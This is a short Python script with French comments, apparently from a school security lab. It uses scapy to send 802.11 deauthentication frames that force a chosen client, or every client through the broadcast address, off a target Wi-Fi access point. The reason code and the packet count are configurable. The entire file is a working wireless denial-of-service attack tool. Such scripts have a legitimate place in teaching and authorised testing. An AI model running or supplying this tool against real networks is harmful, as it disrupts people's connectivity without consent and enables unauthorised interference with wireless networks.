#!/usr/bin/env python3 
# -*- coding: utf-8 -*-
#----------------------------------------------------------------------------
# Created By  : Nicolas Hungerbühler & Lucas Gianinetti
# Created Date: 31.03.22
# ---------------------------------------------------------------------------
# Ce programme va envoyer des requêtes de déauthentification d'un client à un
# AP.
# Il prend en paramètre une interface réseau (/!\ Doit être en mode
# monitor channel hopping /!\), une adresse MAC cible. une addresse MAC d'un AP et 
# optionnellement un nombre de requêtes de désauthentification.
# Le programme demande quel Reason Code veut être utilisé puis crée la trame et 
# en envoie "n" nombres.
# ---------------------------------------------------------------------------
# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py

import argparse

from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

################## Passing arguments ##################
parser = argparse.ArgumentParser(prog="Scapy deauth attack",
                                 usage="%(prog)s -i wlan0mon -b 00:11:22:33:44:55 -c 55:44:33:22:11:00 -n 50",
                                 description="Scapy based wifi Deauth",
                                 allow_abbrev=False)

parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode channel hopping")

parser.add_argument("-b", "--BSSID", required=True, help="The BSSID of the Wireless Access Point you want to target")

parser.add_argument("-c", "--Client", required=True,
                    help="The MAC address of the Client you want to kick off the Access Point, use FF:FF:FF:FF:FF:FF if you want a broadcasted deauth to all stations on the targeted Access Point")

parser.add_argument("-n", "--Number", required=False, help="The number of deauth packets you want to send, default = 5", default=5)

args = parser.parse_args()

####################################
################## main ##################

# Demande du reason code de la deauthentification
reason_input = input("Which option do you want ? \n "
"1-Unspecified \n "
"4-Disassoiated due to inactivity \n "
"5-Disassociated because AP is unable to handle all currently associated stations\n "
"8-Deauthenticated because sending STA is leaving BSS\n")

# Envoyé de l'AP au client
if(int(reason_input) != 8):
    mac_source = args.BSSID
    mac_dest = args.Client
else: # Envoyé du client à l'AP
    mac_source = args.Client
    mac_dest = args.BSSID

# On crée le packet avec le bon type (deauth), reason code et les bonnes adresses
packet = RadioTap() / Dot11(type=0, subtype=12, addr1=mac_dest, addr2=mac_source, addr3=args.BSSID) / Dot11Deauth(
   reason = int(reason_input))

# Envoie de(s) packet un nombre n mis en argument (5 par defaut)
sendp(packet, inter=0.1, count=int(args.Number), iface=args.Interface, verbose=1)